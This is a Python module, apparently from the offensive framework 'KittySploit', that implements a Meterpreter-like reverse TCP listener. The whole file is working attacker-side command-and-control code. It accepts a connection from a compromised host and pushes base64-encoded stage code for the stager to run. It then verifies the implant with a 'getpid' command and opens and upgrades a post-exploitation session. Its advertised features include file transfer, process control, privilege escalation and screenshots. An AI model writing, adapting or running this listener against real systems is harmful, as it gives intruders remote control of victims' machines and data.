#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import socket
import threading
import time
import struct

class Module(Listener):
    """Meterpreter reverse TCP listener with advanced post-exploitation features"""
    
    __info__ = {
        'name': 'Meterpreter Reverse TCP',
        'description': 'Advanced Meterpreter-like reverse TCP listener with post-exploitation capabilities',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'handler': Handler.REVERSE,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/'
        ]
    }

    lhost = OptString("127.0.0.1", "Local IPv4 or IPv6 address", True)
    lport = OptPort(4444, "Local TCP port", True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.sock = None
        self.running = False
        self.listener_thread = None
        self.job_id = None
        self.created_session_id = None  # Store the created session ID
        self.session_created_event = threading.Event()  # Event to signal session creation
        
        # Initialize handler from __info__ if available
        if hasattr(self, '__info__') and 'handler' in self.__info__:
            handler_info = self.__info__['handler']
            if hasattr(handler_info, 'value'):
                handler_value = handler_info.value
            elif hasattr(handler_info, 'name'):
                handler_value = handler_info.name.lower()
            else:
                handler_value = str(handler_info).lower()
            # Set the handler option value
            self.handler = handler_value
        # Initialize session_type from __info__ if available
        if hasattr(self, '__info__') and 'session_type' in self.__info__:
            session_type_info = self.__info__['session_type']
            if hasattr(session_type_info, 'value'):
                session_type_value = session_type_info.value
            elif hasattr(session_type_info, 'name'):
                session_type_value = session_type_info.name.lower()
            else:
                session_type_value = str(session_type_info).lower()
            # Set the session_type option value
            self.session_type = session_type_value
    
    def run(self, background=False):
        """Run the Meterpreter reverse TCP listener"""
        try:
            # Get option values
            lhost = str(self.lhost) if self.lhost else "127.0.0.1"
            lport = int(self.lport) if self.lport else 4444
            
            print_info(f"Starting {self.name}...")
            print_info(f"Listening on {lhost}:{lport}")
            print_warning("Waiting for connection...")
            
            if background:
                print_info("Running in background mode")
            else:
                print_info("Press Ctrl+C to stop the listener")
            
            # Start listener in a separate thread
            self.running = True
            self.listener_thread = threading.Thread(target=self._start_listener, args=(lhost, lport))
            self.listener_thread.daemon = True
            self.listener_thread.start()
            
            if background:
                # Return immediately in background mode
                return True
            
            # Wait for connection to be accepted and session to be created
            # Wait indefinitely until connection or Ctrl+C
            try:
                # Use a loop with short timeout to allow KeyboardInterrupt to be caught
                while self.running:
                    # Wait for session to be created with short timeout to check for Ctrl+C
                    if self.session_created_event.wait(timeout=0.5):  # Check every 0.5 seconds
                        # Session created, stop listener and return session_id
                        self.running = False
                        if self.created_session_id:
                            print_info("Session created. Listener stopped.")
                            return self.created_session_id
                        break
            except KeyboardInterrupt:
                print_info("\n[!] Interrupted by user")
                self.running = False
            
            # Return session_id if one was created, otherwise return True
            return self.created_session_id if self.created_session_id else True
            
        except Exception as e:
            print_error(f"Error starting listener: {e}")
            return False
        finally:
            if not background:
                self.shutdown()
    
    def _check_port_available(self, host, port):
        """Check if port is available by trying to bind to it"""
        test_sock = None
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)  # Don't reuse for check
            test_sock.settimeout(1.0)
            test_sock.bind((host, port))
            test_sock.close()
            return True
        except OSError as e:
            # Check if it's a "port already in use" error
            error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
            if error_code in [10048, 98, 48]:  # Windows: 10048, Linux: 98, macOS: 48
                return False
            # Other OSError - might be permission issue, but port might be available
            return True
        except Exception:
            # Other errors - assume port might be available
            return True
        finally:
            if test_sock:
                try:
                    test_sock.close()
                except:
                    pass
    
    def _start_listener(self, host, port):
        """Start the listener in a separate thread"""
        try:
            # Check if port is already in use
            if not self._check_port_available(host, port):
                print_error(f"Port {port} is already in use. Cannot start listener.")
                print_error("Please stop the existing listener or use a different port.")
                self.running = False
                return
            
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Don't use SO_REUSEADDR to prevent binding to an already used port
            # This ensures we get an error if the port is already in use
            # Use a longer timeout to check if we should stop (1 second)
            # This allows checking self.running periodically
            self.sock.settimeout(1.0)
            
            try:
                self.sock.bind((host, port))
            except OSError as e:
                # Check if it's a "port already in use" error
                error_code = getattr(e, 'winerror', None) or getattr(e, 'errno', None)
                error_msg = str(e)
                if error_code in [10048, 98, 48] or 'already in use' in error_msg.lower() or 'address already in use' in error_msg.lower():
                    print_error(f"Port {port} is already in use. Cannot start listener.")
                    print_error("Please stop the existing listener or use a different port.")
                    self.running = False
                    if self.sock:
                        try:
                            self.sock.close()
                        except:
                            pass
                        self.sock = None
                    return
                else:
                    # Re-raise other OSError
                    raise
            
            self.sock.listen(5)
            
            print_success(f"Listening on {host}:{port}")
            
            # Accept only one connection
            while self.running:
                try:
                    client_socket, address = self.sock.accept()
                    if not self.running:  # Check if we should still accept
                        client_socket.close()
                        break
                    
                    print_success(f"Connection received from {address[0]}:{address[1]}")
                    
                    # Handle the connection (blocking - wait for session creation)
                    self._handle_connection(client_socket, address)
                    
                    # Stop listening after handling the connection
                    self.running = False
                    break
                        
                except socket.timeout:
                    # Timeout occurred, check if we should continue
                    continue
                except OSError as e:
                    if self.running:
                        print_error(f"Error accepting connection: {e}")
                    break
                except Exception as e:
                    if self.running:
                        print_error(f"Error accepting connection: {e}")
                    break
                    
        except Exception as e:
            if self.running:
                print_error(f"Error in listener thread: {e}")
        finally:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
                self.sock = None
    
    def _handle_connection(self, client_socket, address):
        """Handle incoming connection"""
        try:
            # First, send the Meterpreter stage code to the stager
            # The stager will receive this, execute it, and then continue with JSON protocol
            try:
                # Get the stage code from the payload module
                stage_code = self._get_meterpreter_stage_code()
                if stage_code:
                    # Encode stage code as base64
                    import base64
                    stage_bytes = base64.b64encode(stage_code.encode('utf-8'))
                    
                    # Send length (4 bytes big-endian) then stage code
                    length = struct.pack('>I', len(stage_bytes))
                    client_socket.sendall(length + stage_bytes)
                    print_info(f"[DEBUG] Sent Meterpreter stage code ({len(stage_bytes)} bytes) to stager")
                else:
                    print_warning("[DEBUG] Could not get stage code, stager may fail")
            except Exception as e:
                print_warning(f"[DEBUG] Error sending stage code: {e}")
                # Continue anyway - maybe it's not a stager connection
            
            # Now wait a moment for the stage to load and initialize
            time.sleep(1.0)  # Increased to give stage time to execute
            
            # Verify that the payload is working by sending a test command
            # If the payload failed to execute (e.g., syntax error), it won't respond
            payload_valid = self._verify_payload(client_socket)
            
            if not payload_valid:
                print_error("Payload verification failed - stage may have failed to execute")
                print_error("Connection closed - no session created")
                try:
                    client_socket.close()
                except:
                    pass
                # Signal failure so listener can exit
                self.session_created_event.set()
                return
            
            # Don't send banner text - client expects JSON commands immediately
            # Create Meterpreter session only if payload is verified
            session_id = self.create_session_from_connection(
                client_socket,
                address,
                {
                    'handler_type': Handler.REVERSE.value,
                    'session_type': SessionType.METERPRETER.value,
                    'meterpreter_version': '1.0.0'
                }
            )
            
            if session_id:
                print_success(f"Meterpreter session {session_id} opened!")
                print_info(f"Session ID: {session_id}")
                print_info(f"Target: {address[0]}:{address[1]}")
                
                # Verify socket is stored
                if hasattr(self, '_session_connections') and session_id in self._session_connections:
                    print_info(f"[DEBUG] Socket stored in _session_connections for session {session_id}")
                else:
                    print_warning(f"[DEBUG] Socket NOT found in _session_connections for session {session_id}")
                
                # Store session_id and signal that session was created
                self.created_session_id = session_id
                self.session_created_event.set()
                
                # Give the client a moment to start its main loop
                # The Python client needs time to enter its run() loop
                time.sleep(0.5)  # Reduced since we already verified it's working
                
                # Upgrade shell to meterpreter if framework is available
                if self.framework and hasattr(self.framework, 'shell_manager'):
                    self._upgrade_to_meterpreter(session_id)
            else:
                print_error("Failed to create Meterpreter session")
                client_socket.close()
                # Signal failure so listener can exit
                self.session_created_event.set()
                
        except Exception as e:
            print_error(f"Error handling connection: {e}")
            try:
                client_socket.close()
            except:
                pass
    
    def _verify_payload(self, client_socket):
        """Verify that the payload is working by sending a test command"""
        try:
            import json
            import struct
            
            # Set a short timeout for the verification
            original_timeout = client_socket.gettimeout()
            client_socket.settimeout(5.0)  # 5 second timeout for verification
            
            # Send a simple test command (getpid)
            cmd_data = {
                'command': 'getpid',
                'args': []
            }
            cmd_json = json.dumps(cmd_data)
            cmd_bytes = cmd_json.encode('utf-8')
            
            # Send length (4 bytes big-endian) then data
            length = struct.pack('>I', len(cmd_bytes))
            client_socket.sendall(length + cmd_bytes)
            
            # Wait for response
            # Receive length (4 bytes)
            length_data = b''
            start_time = time.time()
            while len(length_data) < 4:
                try:
                    chunk = client_socket.recv(4 - len(length_data))
                    if not chunk:
                        print_warning("[DEBUG] Payload verification: connection closed")
                        return False
                    length_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 5.0:
                        print_warning("[DEBUG] Payload verification: timeout waiting for response")
                        return False
                    continue
            
            response_length = struct.unpack('>I', length_data)[0]
            
            # Receive response data
            response_data = b''
            while len(response_data) < response_length:
                try:
                    chunk = client_socket.recv(response_length - len(response_data))
                    if not chunk:
                        print_warning("[DEBUG] Payload verification: connection closed while receiving response")
                        return False
                    response_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 5.0:
                        print_warning("[DEBUG] Payload verification: timeout receiving response")
                        return False
                    continue
            
            # Parse response
            try:
                response = json.loads(response_data.decode('utf-8'))
                # Check if we got a valid response (status 0 means success)
                if response.get('status') == 0:
                    print_info("[DEBUG] Payload verification: SUCCESS")
                    # Restore original timeout
                    client_socket.settimeout(original_timeout)
                    return True
                else:
                    print_warning(f"[DEBUG] Payload verification: got error status {response.get('status')}")
                    client_socket.settimeout(original_timeout)
                    return False
            except json.JSONDecodeError:
                print_warning("[DEBUG] Payload verification: invalid JSON response")
                client_socket.settimeout(original_timeout)
                return False
                
        except Exception as e:
            print_warning(f"[DEBUG] Payload verification failed: {e}")
            try:
                client_socket.settimeout(original_timeout)
            except:
                pass
            return False
    
    def _get_meterpreter_stage_code(self):
        """Get the Meterpreter stage code from the payload module"""
        try:
            # Try to get the payload module from framework
            if self.framework and hasattr(self.framework, 'module_loader'):
                # Load the Python Meterpreter payload module
                payload_path = 'payloads/singles/cmd/unix/python_meterpreter_reverse_tcp'
                payload_module = self.framework.module_loader.load_module(payload_path, framework=self.framework)
                
                if payload_module and hasattr(payload_module, 'get_stage_code'):
                    return payload_module.get_stage_code()
                elif payload_module and hasattr(payload_module, 'meterpreter_stage_code'):
                    return payload_module.meterpreter_stage_code
        except Exception as e:
            print_warning(f"Could not get stage code from payload module: {e}")
        
        # Fallback: return None (stager will handle it)
        return None
    
    def shutdown(self):
        """Shutdown the listener"""
        print_info("Shutting down listener...")
        self.running = False
        
        # Update job status if running as background job
        if self.job_id:
            try:
                from core.job_manager import global_job_manager
                global_job_manager.update_job_status(self.job_id, 'completed', "Listener stopped")
            except Exception as e:
                print_warning(f"Could not update job status: {e}")
        
        # Close the socket to stop accepting new connections
        try:
            if self.sock:
                self.sock.close()
                print_success("Listener stopped gracefully")
        except OSError as e:
            print_warning(f"Error during shutdown: {e}")
        except Exception as e:
            print_warning(f"Unexpected error during shutdown: {e}")
        
        # Wait for listener thread to finish
        if self.listener_thread and self.listener_thread.is_alive():
            self.listener_thread.join(timeout=2)
            if self.listener_thread.is_alive():
                print_warning("Listener thread did not stop gracefully")
    
    def _get_meterpreter_banner(self) -> str:
        """Get Meterpreter banner"""
        banner = """
[*] Meterpreter session opened!
[*] Starting post-exploitation phase...
[*] Type 'help' for available commands

"""
        return banner
    
    def _upgrade_to_meterpreter(self, session_id: str):
        """Upgrade existing shell session to Meterpreter"""
        try:
            print_info(f"Upgrading session {session_id} to Meterpreter...")
            
            # Check if shell manager exists
            if not hasattr(self.framework, 'shell_manager'):
                print_warning("Shell manager not available, skipping upgrade")
                return False
            
            shell_manager = self.framework.shell_manager
            
            # Check if shell already exists
            existing_shell = shell_manager.get_shell(session_id)
            
            if existing_shell:
                print_info(f"Existing shell found: {existing_shell.shell_name}")
                
                # If it's already meterpreter, we're done
                if existing_shell.shell_name == "meterpreter":
                    print_success("Session is already a Meterpreter session")
                    return True
                
                # Get shell state to preserve
                shell_state = {
                    'username': existing_shell.username,
                    'hostname': existing_shell.hostname,
                    'is_root': existing_shell.is_root,
                    'current_directory': existing_shell.current_directory,
                    'environment_vars': existing_shell.environment_vars.copy(),
                    'command_history': existing_shell.command_history.copy()
                }
                
                # Remove old shell
                shell_manager.remove_shell(session_id)
                
                # Create new Meterpreter shell
                from core.framework.shell.meterpreter_shell import MeterpreterShell
                
                meterpreter_shell = MeterpreterShell(session_id, SessionType.METERPRETER.value, self.framework)
                
                # Restore state
                meterpreter_shell.username = shell_state['username']
                meterpreter_shell.hostname = shell_state['hostname']
                meterpreter_shell.is_root = shell_state['is_root']
                meterpreter_shell.current_directory = shell_state['current_directory']
                meterpreter_shell.environment_vars = shell_state['environment_vars']
                meterpreter_shell.command_history = shell_state['command_history']
                
                # Register the new shell
                shell_manager.shells[session_id] = meterpreter_shell
                shell_manager.switch_shell(session_id)
                
                print_success(f"Successfully upgraded session {session_id} to Meterpreter!")
                return True
            else:
                # No existing shell, create new Meterpreter shell
                from core.framework.shell.meterpreter_shell import MeterpreterShell
                
                meterpreter_shell = MeterpreterShell(session_id, SessionType.METERPRETER.value, self.framework)
                shell_manager.shells[session_id] = meterpreter_shell
                shell_manager.switch_shell(session_id)
                
                print_success(f"Created new Meterpreter shell for session {session_id}")
                return True
                
        except Exception as e:
            print_error(f"Error upgrading to Meterpreter: {e}")
            return False
    
    def upgrade_session(self, session_id: str) -> bool:
        """
        Public method to upgrade a session to Meterpreter
        Can be called from other modules or commands
        
        Args:
            session_id: The session ID to upgrade
            
        Returns:
            bool: True if upgrade successful, False otherwise
        """
        if not self.framework or not hasattr(self.framework, 'shell_manager'):
            print_error("Framework or shell manager not available")
            return False
        
        return self._upgrade_to_meterpreter(session_id)
    
    def get_handler_info(self):
        """Get handler information"""
        info = {
            'handler': Handler.REVERSE.value,
            'handler_enum': Handler.REVERSE,
            'session_type': SessionType.METERPRETER.value,
            'session_enum': SessionType.METERPRETER,
            'meterpreter_version': '1.0.0',
            'features': [
                'System information gathering',
                'File operations (upload/download)',
                'Process management',
                'Network operations',
                'Privilege escalation',
                'Screenshot capture',
                'And more...'
            ]
        }
        
        return info

